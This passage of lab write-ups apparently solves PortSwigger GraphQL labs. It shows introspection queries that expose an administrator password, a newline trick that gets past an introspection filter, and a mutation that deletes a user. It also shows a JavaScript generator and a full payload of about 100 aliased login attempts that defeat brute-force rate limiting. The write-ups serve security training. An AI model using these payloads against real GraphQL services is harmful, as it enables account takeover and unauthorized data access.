
```json
{

  "query": " query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"

}
```

``Introspection Result``

<img width="1540" height="640" alt="image" src="https://github.com/user-attachments/assets/07d67e10-15c5-4b3a-95a9-5a60b4b257f7" />

<img width="843" height="720" alt="image" src="https://github.com/user-attachments/assets/acca9c26-a639-4f12-8c97-1b4b5edcd8de" />

now try to use ``getUser(id:Int!): User`` to find **``administrator``** user


```graphql
{
  getUser(id: 1) {
    id
    username
    password
  }
}

```

<img width="1316" height="367" alt="image" src="https://github.com/user-attachments/assets/e932fd39-cead-4b3d-9c44-3ae3474b1329" />


```
administrator : lnqajgkwlru628r4sgjc
```

<img width="1330" height="486" alt="image" src="https://github.com/user-attachments/assets/4ed941d2-305e-4e47-8b02-58d16d623fb2" />

<img width="1290" height="268" alt="image" src="https://github.com/user-attachments/assets/89d700e2-75c7-4ab1-8c53-441c2c82b3fe" />


  
</details>





<details>
  <summary>Lab: Finding a hidden GraphQL endpoint</summary>


###>  The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.

> To solve the lab, find the hidden endpoint and delete ``carlos``. 

----


first test common ``graphql`` endpoints

<img width="557" height="460" alt="image" src="https://github.com/user-attachments/assets/3172e313-20bc-4226-9b04-920f1893b50a" />

all responses ``404`` except one ``405`` but say ``method not allowed``

<img width="954" height="241" alt="image" src="https://github.com/user-attachments/assets/3faecc2c-88fb-4074-926b-c76228eed772" />

it seem that it allow **``GET``** method

<img width="919" height="572" alt="image" src="https://github.com/user-attachments/assets/8a3a78bc-2a86-437e-a9c5-af9d7c275a0f" />

now **``qurey not present``**

<img width="1534" height="447" alt="image" src="https://github.com/user-attachments/assets/d77a13d6-bb67-4ee9-8539-4d1d96de0408" />

first put this header in request 

```http
Content-Type: application/json;
```

and try to add simple qurey to see what will be the result

```json
{
  "query": "query{__typename}"
}
```

and booom 

<img width="1534" height="441" alt="image" src="https://github.com/user-attachments/assets/ee8a6f2c-bc06-4909-99aa-cf48313978ef" />

now try to write introspction simple query :

```json
{
  "query": "{__schema{queryType{name}}}"
}
```

response say ``introspection not allowed`` it seems there is filteration on it 

<img width="1542" height="449" alt="image" src="https://github.com/user-attachments/assets/9c22e8d9-09b0-4ac3-9ce2-6471385de770" />

try to pypass it by using **``\n``**:

```json
{
  "query": "{__schema\n{queryType{name}}}"
}

                      |
```
and it work 🔥

<img width="1317" height="438" alt="image" src="https://github.com/user-attachments/assets/1dfa68f6-e45c-4d8e-8671-8b69a4dee4e9" />


now use full ``introspection`` qurey 

```json
{
  "query": " query IntrospectionQuery { __schema\n { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}

```

<img width="1549" height="705" alt="image" src="https://github.com/user-attachments/assets/e453946c-1581-408f-9545-f8e30d78be1e" />

 ### > use [Introspection Visualization](http://nathanrandal.com/graphql-visualizer/)

<img width="1874" height="580" alt="image" src="https://github.com/user-attachments/assets/02b0bd11-6c73-450d-8307-f4c6419c645c" />

now get users

```json
{
  "query": "{ getUser(id: 1) { id username }}"
}
```

<img width="1402" height="472" alt="image" src="https://github.com/user-attachments/assets/eb842d5b-c4fe-41d7-bd12-fbb7a525e6ea" />

```
id   user
1     adminstrator
2     wiener
3     carlos
```

in ``schema`` foud this ``DeleteOrganizationUserInput``

<img width="771" height="603" alt="image" src="https://github.com/user-attachments/assets/ce921faf-ca9f-48b8-9711-e13caa58d0a1" />

download **`inql`** extension to burp and take the json respose of **``introspection``** to it to see the ``mutaion`` 

<img width="1264" height="447" alt="image" src="https://github.com/user-attachments/assets/74c533cd-2e73-462b-8834-cad3cba39347" />

or use this simple query :

```json
{
  "query": "{ __schema\n { mutationType { name fields { name args { name type { name kind } } } } }}"
}
```

<img width="1441" height="467" alt="image" src="https://github.com/user-attachments/assets/d1eee12e-d58d-4b96-b6a9-3458cabccbbd" />


good now we know that there is **``mutaion``** call **``DeleteOrganizationUserInput``** 

### > Discover the fields inside ``DeleteOrganizationUserInput``

```json
{
  "query": "{ __type(name: \"DeleteOrganizationUserInput\")\n { name kind inputFields { name type { name kind ofType { name kind } } } }}"
}
```

``output``

<img width="1532" height="519" alt="image" src="https://github.com/user-attachments/assets/049c1775-e902-48d6-9e24-17d9dd7c968a" />


so it require the **``id``**

```json
{
  "query": "mutation { deleteOrganizationUser(input: { id: 3 }) { __typename }}"
}
```

<img width="1226" height="399" alt="image" src="https://github.com/user-attachments/assets/555e0324-a75a-4979-a877-078504f1bfa8" />




  
</details>





<details>
  <summary>Lab: Bypassing GraphQL brute force protections</summary>


- <details>
     <summary>Tip</summary>
  
  <img width="1086" height="471" alt="image" src="https://github.com/user-attachments/assets/9aaf76d7-99e0-47c5-995f-90ddd91d2908" />
  
  ```javascript
  
  copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
  bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
          token
          success
      }
  `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
  ```
  
  <img width="1314" height="725" alt="image" src="https://github.com/user-attachments/assets/fa809ec6-fc31-4f69-ab17-59c287b0afbd" />
  

  -----
  
  ### change it form this :
  
  <img width="1439" height="783" alt="image" src="https://github.com/user-attachments/assets/5299c3b2-8225-4368-9faa-e31770bd3fdb" />
  
  ```graphql
  mutation login($input: LoginInput!) {
          login(input: $input) {
              token
              success
          }
      }
  ```
  
  ### to this
  
  
  
  ```graphql
  mutation  {
          
      }
  ```
  
  ### and inside it put the output of the js script
  
  
  ```json
  
  bruteforce64:login(input:{password: "555555", username: "carlos"}) {
          token
          success
      }
  
  
  bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
          token
          success
      }
  
  
  bruteforce66:login(input:{password: "131313", username: "carlos"}) {
          token
          success
      }
  
  
  
  ```
  
  
  ### result 
  
  
  ```
  mutation login{
  
  bruteforce64:login(input:{password: "555555", username: "carlos"}) {
          token
          success
      }
  
  
  bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
          token
          success
      }
  
  
  bruteforce66:login(input:{password: "131313", username: "carlos"}) {
          token
          success
      }
  
  
  
  }
  ```
  
  


  </details>


```json

{
    "query": "mutation bruteForce {\n    try1: login(input: {username: \"carlos\", password: \"123456\"}) { token success }\n    try2: login(input: {username: \"carlos\", password: \"password\"}) { token success }\n    try3: login(input: {username: \"carlos\", password: \"12345678\"}) { token success }\n    try4: login(input: {username: \"carlos\", password: \"qwerty\"}) { token success }\n    try5: login(input: {username: \"carlos\", password: \"123456789\"}) { token success }\n    try6: login(input: {username: \"carlos\", password: \"12345\"}) { token success }\n    try7: login(input: {username: \"carlos\", password: \"1234\"}) { token success }\n    try8: login(input: {username: \"carlos\", password: \"111111\"}) { token success }\n    try9: login(input: {username: \"carlos\", password: \"1234567\"}) { token success }\n    try10: login(input: {username: \"carlos\", password: \"dragon\"}) { token success }\n    try11: login(input: {username: \"carlos\", password: \"123123\"}) { token success }\n    try12: login(input: {username: \"carlos\", password: \"baseball\"}) { token success }\n    try13: login(input: {username: \"carlos\", password: \"abc123\"}) { token success }\n    try14: login(input: {username: \"carlos\", password: \"football\"}) { token success }\n    try15: login(input: {username: \"carlos\", password: \"monkey\"}) { token success }\n    try16: login(input: {username: \"carlos\", password: \"letmein\"}) { token success }\n    try17: login(input: {username: \"carlos\", password: \"shadow\"}) { token success }\n    try18: login(input: {username: \"carlos\", password: \"master\"}) { token success }\n    try19: login(input: {username: \"carlos\", password: \"666666\"}) { token success }\n    try20: login(input: {username: \"carlos\", password: \"qwertyuiop\"}) { token success }\n    try21: login(input: {username: \"carlos\", password: \"123321\"}) { token success }\n    try22: login(input: {username: \"carlos\", password: \"mustang\"}) { token success }\n    try23: login(input: {username: \"carlos\", password: \"1234567890\"}) { token success }\n    try24: login(input: {username: \"carlos\", password: \"michael\"}) { token success }\n    try25: login(input: {username: \"carlos\", password: \"654321\"}) { token success }\n    try26: login(input: {username: \"carlos\", password: \"superman\"}) { token success }\n    try27: login(input: {username: \"carlos\", password: \"1qaz2wsx\"}) { token success }\n    try28: login(input: {username: \"carlos\", password: \"7777777\"}) { token success }\n    try29: login(input: {username: \"carlos\", password: \"121212\"}) { token success }\n    try30: login(input: {username: \"carlos\", password: \"000000\"}) { token success }\n    try31: login(input: {username: \"carlos\", password: \"qazwsx\"}) { token success }\n    try32: login(input: {username: \"carlos\", password: \"123qwe\"}) { token success }\n    try33: login(input: {username: \"carlos\", password: \"killer\"}) { token success }\n    try34: login(input: {username: \"carlos\", password: \"trustno1\"}) { token success }\n    try35: login(input: {username: \"carlos\", password: \"jordan\"}) { token success }\n    try36: login(input: {username: \"carlos\", password: \"jennifer\"}) { token success }\n    try37: login(input: {username: \"carlos\", password: \"zxcvbnm\"}) { token success }\n    try38: login(input: {username: \"carlos\", password: \"asdfgh\"}) { token success }\n    try39: login(input: {username: \"carlos\", password: \"hunter\"}) { token success }\n    try40: login(input: {username: \"carlos\", password: \"buster\"}) { token success }\n    try41: login(input: {username: \"carlos\", password: \"soccer\"}) { token success }\n    try42: login(input: {username: \"carlos\", password: \"harley\"}) { token success }\n    try43: login(input: {username: \"carlos\", password: \"batman\"}) { token success }\n    try44: login(input: {username: \"carlos\", password: \"andrew\"}) { token success }\n    try45: login(input: {username: \"carlos\", password: \"tigger\"}) { token success }\n    try46: login(input: {username: \"carlos\", password: \"sunshine\"}) { token success }\n    try47: login(input: {username: \"carlos\", password: \"iloveyou\"}) { token success }\n    try48: login(input: {username: \"carlos\", password: \"2000\"}) { token success }\n    try49: login(input: {username: \"carlos\", password: \"charlie\"}) { token success }\n    try50: login(input: {username: \"carlos\", password: \"robert\"}) { token success }\n    try51: login(input: {username: \"carlos\", password: \"thomas\"}) { token success }\n    try52: login(input: {username: \"carlos\", password: \"hockey\"}) { token success }\n    try53: login(input: {username: \"carlos\", password: \"ranger\"}) { token success }\n    try54: login(input: {username: \"carlos\", password: \"daniel\"}) { token success }\n    try55: login(input: {username: \"carlos\", password: \"starwars\"}) { token success }\n    try56: login(input: {username: \"carlos\", password: \"klaster\"}) { token success }\n    try57: login(input: {username: \"carlos\", password: \"112233\"}) { token success }\n    try58: login(input: {username: \"carlos\", password: \"george\"}) { token success }\n    try59: login(input: {username: \"carlos\", password: \"computer\"}) { token success }\n    try60: login(input: {username: \"carlos\", password: \"michelle\"}) { token success }\n    try61: login(input: {username: \"carlos\", password: \"jessica\"}) { token success }\n    try62: login(input: {username: \"carlos\", password: \"pepper\"}) { token success }\n    try63: login(input: {username: \"carlos\", password: \"1111\"}) { token success }\n    try64: login(input: {username: \"carlos\", password: \"zxcvbn\"}) { token success }\n    try65: login(input: {username: \"carlos\", password: \"555555\"}) { token success }\n    try66: login(input: {username: \"carlos\", password: \"11111111\"}) { token success }\n    try67: login(input: {username: \"carlos\", password: \"131313\"}) { token success }\n    try68: login(input: {username: \"carlos\", password: \"freedom\"}) { token success }\n    try69: login(input: {username: \"carlos\", password: \"777777\"}) { token success }\n    try70: login(input: {username: \"carlos\", password: \"pass\"}) { token success }\n    try71: login(input: {username: \"carlos\", password: \"maggie\"}) { token success }\n    try72: login(input: {username: \"carlos\", password: \"159753\"}) { token success }\n    try73: login(input: {username: \"carlos\", password: \"aaaaaa\"}) { token success }\n    try74: login(input: {username: \"carlos\", password: \"ginger\"}) { token success }\n    try75: login(input: {username: \"carlos\", password: \"princess\"}) { token success }\n    try76: login(input: {username: \"carlos\", password: \"joshua\"}) { token success }\n    try77: login(input: {username: \"carlos\", password: \"cheese\"}) { token success }\n    try78: login(input: {username: \"carlos\", password: \"amanda\"}) { token success }\n    try79: login(input: {username: \"carlos\", password: \"summer\"}) { token success }\n    try80: login(input: {username: \"carlos\", password: \"love\"}) { token success }\n    try81: login(input: {username: \"carlos\", password: \"ashley\"}) { token success }\n    try82: login(input: {username: \"carlos\", password: \"nicole\"}) { token success }\n    try83: login(input: {username: \"carlos\", password: \"chelsea\"}) { token success }\n    try84: login(input: {username: \"carlos\", password: \"biteme\"}) { token success }\n    try85: login(input: {username: \"carlos\", password: \"matthew\"}) { token success }\n    try86: login(input: {username: \"carlos\", password: \"access\"}) { token success }\n    try87: login(input: {username: \"carlos\", password: \"yankees\"}) { token success }\n    try88: login(input: {username: \"carlos\", password: \"987654321\"}) { token success }\n    try89: login(input: {username: \"carlos\", password: \"dallas\"}) { token success }\n    try90: login(input: {username: \"carlos\", password: \"austin\"}) { token success }\n    try91: login(input: {username: \"carlos\", password: \"thunder\"}) { token success }\n    try92: login(input: {username: \"carlos\", password: \"taylor\"}) { token success }\n    try93: login(input: {username: \"carlos\", password: \"matrix\"}) { token success }\n    try94: login(input: {username: \"carlos\", password: \"mobilemail\"}) { token success }\n    try95: login(input: {username: \"carlos\", password: \"mom\"}) { token success }\n    try96: login(input: {username: \"carlos\", password: \"monitor\"}) { token success }\n    try97: login(input: {username: \"carlos\", password: \"monitoring\"}) { token success }\n    try98: login(input: {username: \"carlos\", password: \"montana\"}) { token success }\n    try99: login(input: {username: \"carlos\", password: \"moon\"}) { token success }\n    try100: login(input: {username: \"carlos\", password: \"moscow\"}) { token success }\n}",
    "operationName": "bruteForce",
    "variables": {}
}

```


<img width="1436" height="738" alt="image" src="https://github.com/user-attachments/assets/d63785c5-a954-4634-8abc-acce52530286" />

password 

```
123123
```

Token

```
Vuw96J2kIh6BrKRrjlwhb8tQ96AViUTI
```

  
</details>




























